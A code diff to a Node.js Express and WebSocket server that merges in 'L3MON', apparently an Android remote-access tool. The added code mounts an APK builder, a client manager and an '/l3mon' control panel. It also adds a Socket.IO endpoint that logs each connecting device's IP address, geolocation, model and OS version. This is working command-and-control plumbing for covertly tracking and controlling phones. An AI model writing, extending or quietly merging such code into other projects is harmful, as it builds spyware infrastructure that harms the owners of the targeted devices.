@@ -6,7 +6,27 @@ const { WebSocketServer } = require('ws')
 const { spawn } = require('child_process')
 const fs = require('fs')
 
+// L3MON Imports
+const IO = require('socket.io')
+const geoip = require('geoip-lite')
+const CONST = require('./includes/const')
+const db = require('./includes/databaseGateway')
+const logManager = require('./includes/logManager')
+// Initialize clientManager with db (it expects db as arg)
+const ClientManagerClass = require('./includes/clientManager')
+const clientManager = new ClientManagerClass(db)
+const apkBuilder = require('./includes/apkBuilder')
+
 const app = express()
+
+// L3MON Globals
+global.CONST = CONST
+global.db = db
+global.logManager = logManager
+global.app = app
+global.clientManager = clientManager
+global.apkBuilder = apkBuilder
+
 const SSL_KEY_PATH = process.env.SSL_KEY_PATH || ''
 const SSL_CERT_PATH = process.env.SSL_CERT_PATH || ''
 let server
@@ -18,6 +38,44 @@ if (SSL_KEY_PATH && SSL_CERT_PATH) {
 } else {
   server = http.createServer(app)
 }
+
+// L3MON Socket.IO
+let client_io = IO(server, { pingInterval: 30000 })
+client_io.on('connection', (socket) => {
+    socket.emit('welcome');
+    let clientParams = socket.handshake.query;
+    let clientAddress = socket.request.connection;
+
+    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
+    let clientGeo = geoip.lookup(clientIP);
+    if (!clientGeo) clientGeo = {}
+
+    clientManager.clientConnect(socket, clientParams.id, {
+        clientIP,
+        clientGeo,
+        device: {
+            model: clientParams.model,
+            manufacture: clientParams.manf,
+            version: clientParams.release
+        }
+    });
+
+    if (CONST.debug) {
+        var onevent = socket.onevent;
+        socket.onevent = function (packet) {
+            var args = packet.data || [];
+            onevent.call(this, packet);    // original call
+            packet.data = ["*"].concat(args);
+            onevent.call(this, packet);      // additional call to catch-all
+        };
+
+        socket.on("*", function (event, data) {
+            console.log(event);
+            console.log(data);
+        });
+    }
+});
+
 const wss = new WebSocketServer({ server, path: '/ws' })
 
 app.set('view engine', 'ejs')
@@ -25,6 +83,11 @@ app.set('views', path.join(__dirname, 'views'))
 app.use(express.json())
 app.use(express.urlencoded({ extended: true }))
 app.use(express.static(path.join(__dirname, 'public')))
+
+// L3MON Static & Routes
+app.use('/l3mon', express.static(path.join(__dirname, 'public/l3mon')))
+app.use('/l3mon', require('./includes/expressRoutes'))
+
 app.get('/favicon.ico', (req, res) => res.status(204).end())
 
 const devices = new Map()
